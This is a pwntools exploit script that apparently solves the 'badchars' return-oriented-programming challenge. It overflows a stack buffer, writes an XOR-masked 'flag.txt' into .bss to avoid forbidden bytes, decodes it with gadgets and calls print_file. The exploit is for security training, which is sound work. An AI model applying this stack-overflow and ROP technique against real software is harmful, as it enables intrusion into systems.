from pwn import *

context.binary = "./badchars"
context.terminal = ["tmux", "splitw", "-h"]
elf = ELF("./badchars")

print_file_plt = elf.plt["print_file"]
usefulGadget = elf.symbols["usefulGadgets"]

write_addr = elf.get_section_by_name(".bss").header.sh_addr  # writable .bss section

pop12_15 = 0x40069C  # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
pop_14_15 = 0x4006A0
pop_rdi = 0x4006A3
store_gadget = 0x400634  # mov qword ptr [r13], r12 ; ret
ret_gadget = 0x4004EE

target = b"flag.txt"
mask = 2
xored_string = bytes([b ^ mask for b in target])

p = process("./badchars")

payload = b"A" * 40  # fill the buffer + RBP
payload += p64(pop12_15)
payload += xored_string  # r12
payload += p64(write_addr)  # r13
payload += p64(0)  # r14
payload += p64(0)  # r15
payload += p64(store_gadget)  # store xored string into data section


def helper(bytes_length: int, location):
    out = b""
    for i in range(bytes_length):  # loop through and xor them
        out += p64(pop_14_15)
        out += p64(mask)  # r14
        out += p64(location + i)  # r15
        out += p64(usefulGadget)  # xor 0x01 with the byte at r15
    return out


payload += helper(len(target), write_addr)

payload += p64(pop_rdi)  # rdi loads w location of evil
payload += p64(write_addr)  # rdi

payload += p64(ret_gadget)

payload += p64(print_file_plt)

p.sendline(payload)
p.interactive()
